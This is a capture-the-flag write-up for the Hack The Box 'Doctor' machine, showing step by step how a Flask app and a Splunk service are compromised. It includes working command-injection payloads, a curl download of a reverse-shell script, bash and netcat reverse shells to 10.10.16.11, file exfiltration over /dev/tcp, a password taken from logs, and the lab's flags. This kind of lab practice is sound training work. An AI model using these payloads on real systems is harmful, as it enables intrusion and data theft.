---
title: "Doctor from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Doctor from HTB

After `nmap` scan we discover that except `22 and 80` ports there is also `8089` port open.
First check `80` port which has some static site and has nothing much.
add this to `/etc/hosts`
```
10.10.10.209 doctors.htb
```
And after adding this and visiting `doctors.htb` we are in `login` page.
`signup` and then `login`
there is only `New message` which maybe we will need to do something.
Checking the `wappalyzer` it runs `Flask 1.0.1`
[](/assets/images/2024-09-08_15-12-00.png)
So maybe we have to do `SSTI` let's check with `{{7}}` if it returns `49` then it is `SSTI` vulnerable and we can get `reverse shell`. It didn't work.
Now start `python -m http.server 80` and type your `tun0` into content. After typing post it and we can see that it connected to us, so we have to execute commands like that.
```
title=test&content=http://10.10.16.11/$(whoami)&submit=post
```
This payload showed me this
```
10.10.10.209 - - [08/Sep/2024 15:41:56] "GET /web HTTP/1.1" 404 -
```
So it is `web` user that connects to us.
```
title=test&content=http://10.10.16.11/$(echo$IFS'help')&submit=Post
```
returned
```
10.10.10.209 - - [08/Sep/2024 15:46:21] "GET /help HTTP/1.1" 404 -
```
so we can't use much special characters.
Now we have to upload `reverse shell` file and then execute it
```bash
title=test&content=http://10.10.16.11/$(curl$IFS'http://10.10.16.11/reverse.sh'$IFS'-o'$IFS'/var/www/html/reverse.sh')&submit=Post
```
then
```bash
title=test&content=http://10.10.16.11/$(bash$IFS'/var/www/html/reverse')&submit=Post
```
And i got connection
```bash
rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.209] 50992
bash: cannot set terminal process group (841): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$
```
Exploring we find `site.db`
```bash
web@doctor:~/blog/flaskblog$ file site.db
file site.db
site.db: SQLite 3.x database, last written using SQLite version 3032003
```
there is no `sqlite3` on machine so we have to download it on our local PC and see what is going in there.
Set up `netcat` on some port and redirect everything it gets to some file
```bash
nc -nlvp 1235 > site.db
listening on [any] 1235 ...
```
Now on machine forward site.db
```bash
web@doctor:~/blog/flaskblog$ cat site.db > /dev/tcp/10.10.16.11/1235
cat site.db > /dev/tcp/10.10.16.11/1235
```
Now read the file
```bash
sqlite3 site.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
	id INTEGER NOT NULL,
	username VARCHAR(20) NOT NULL,
	email VARCHAR(120) NOT NULL,
	image_file VARCHAR(20) NOT NULL,
	password VARCHAR(60) NOT NULL,
	PRIMARY KEY (id),
	UNIQUE (username),
	UNIQUE (email)
);
INSERT INTO user VALUES(1,'admin','admin@doctor.htb','default.gif','$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S');
CREATE TABLE post (
	id INTEGER NOT NULL,
	title VARCHAR(100) NOT NULL,
	date_posted DATETIME NOT NULL,
	content TEXT NOT NULL,
	user_id INTEGER NOT NULL,
	PRIMARY KEY (id),
	FOREIGN KEY(user_id) REFERENCES user (id)
);
INSERT INTO post VALUES(1,'Doctor blog','2020-09-18 20:48:37.55555','A free blog to share medical knowledge. Be kind!',1);
COMMIT;
```
There is an hashed password for `admin` which i guess will not be `root` password.
it is an `bcrypt` so it will take forever to crack so leave it alone.
checking the `id` command we see that we are part of `adm` group so we can read `logs`
```bash
web@doctor:/var/log/apache2$ ls
ls
access.log        access.log.5.gz  error.log.10.gz  error.log.5.gz
access.log.1      access.log.6.gz  error.log.11.gz  error.log.6.gz
access.log.10.gz  access.log.7.gz  error.log.12.gz  error.log.7.gz
access.log.11.gz  access.log.8.gz  error.log.13.gz  error.log.8.gz
access.log.12.gz  access.log.9.gz  error.log.14.gz  error.log.9.gz
access.log.2.gz   backup           error.log.2.gz   other_vhosts_access.log
access.log.3.gz   error.log        error.log.3.gz
access.log.4.gz   error.log.1      error.log.4.gz
```
let's read backup and with `CTRL+f` search for word password maybe we can find it.
I found `10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 50..`
As it seems it is password for `shaun` so switch to that user
User Flag is:
```
4baad6e4e8863cd4826567f013e8d8d7
```
User `shaun`-s credentials can be used to login on `8089` port, which runs on `splunk build 8.0.5`. Searching `splunk RCE` i found `splunkwhisperer2` so lets download it and execute.
```bash
git clone https://github.com/cnotin/SplunkWhisperer2.git
/home/giorgi/Desktop/codes/SplunkWhisperer2/PySplunkWhisperer2/PySplunkWhisperer2_remote.py

python3 PySplunkWhisperer2_remote.py
usage: PySplunkWhisperer2_remote.py [-h] [--scheme SCHEME] --host HOST [--port PORT]
                                    --lhost LHOST [--lport LPORT] [--username USERNAME]
                                    [--password PASSWORD] [--payload PAYLOAD]
                                    [--payload-file PAYLOAD_FILE]
PySplunkWhisperer2_remote.py: error: the following arguments are required: --host, --lhost
```
Write everything we know and also open another `netcat` listener
```python
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.16.11 --lport 9001 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.16.11/9002 0>&1'"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpzcm8d2g1.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.16.11:9001/
10.10.10.209 - - [08/Sep/2024 16:56:12] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!
```
Check `netcat` and you should have connection
```bash
rlwrap nc -nvlp 9002
listening on [any] 9002 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.209] 56558
bash: cannot set terminal process group (1138): Inappropriate ioctl for device
bash: no job control in this shell
root@doctor:/#
```
Root Flag is:
```
9375c052f2db21175dd11ed91f2f8368
```
![](assets/images/2024-09-08_16-58-27.png)
